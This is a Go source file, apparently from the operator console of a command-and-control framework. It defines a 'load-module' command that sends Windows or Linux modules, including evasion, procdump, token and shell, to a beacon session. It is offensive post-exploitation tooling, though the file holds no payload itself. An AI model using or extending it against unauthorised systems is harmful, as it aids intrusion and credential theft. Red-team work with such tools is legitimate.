package grumblecli

import (
	"fmt"
	"os"
	"strings"

	"github.com/desertbit/grumble"
	"google.golang.org/grpc"

	"orsted/client/clientrpc"
)


func SetLoadModuleCommand(conn grpc.ClientConnInterface) {
	loadModuleCmd := &grumble.Command{
		Name: "load-module",
		Help: "load-module",
		Args: func(a *grumble.Args) {
			a.String("module", "module to load")
		},
        Completer: func(prefix string, args []string) []string {
            modulesList := []string{"inline-clr", "run", "ps", "download", "upload", "evasion", "execute-assembly", "shell", "runas", "ls", "procdump", "token", "powercliff"}
            var suggestions []string
            for _, moduleName := range modulesList {
                if strings.HasPrefix(moduleName, prefix) {
                    suggestions = append(suggestions, moduleName)
                }
            }
            return suggestions
        },
		Run: func(c *grumble.Context) error {
			if SelectedSession == nil {
				fmt.Println("No session selected. Use interact command to specify session")
				return nil
			}
			moduleName := c.Args.String("module")
            modulePath := Conf.WindowsModulePath
            extension := ".dll"
            if SelectedSession.Os == "linux" {
                modulePath = Conf.LinuxModulePath
                extension = ".so"
            }
			b, err := os.ReadFile(modulePath + moduleName + extension)
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}
			res, err := clientrpc.AddTaskFunc(conn, SelectedSession.Id, "load-module "+c.Args.String("module"), b, "load-module "+c.Args.String("module"))
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}
			var data [][]string
			data = append(data, []string{
				res.TaskId,
				res.BeacondId,
				res.State,
				string(res.Command),
			})
			prettyPrint(data, []string{"TASKID", "SESSIONID", "STATE", "COMMAND"}, c.App.Stdout())
			return nil
		},
	}
	app.AddCommand(loadModuleCmd)
}
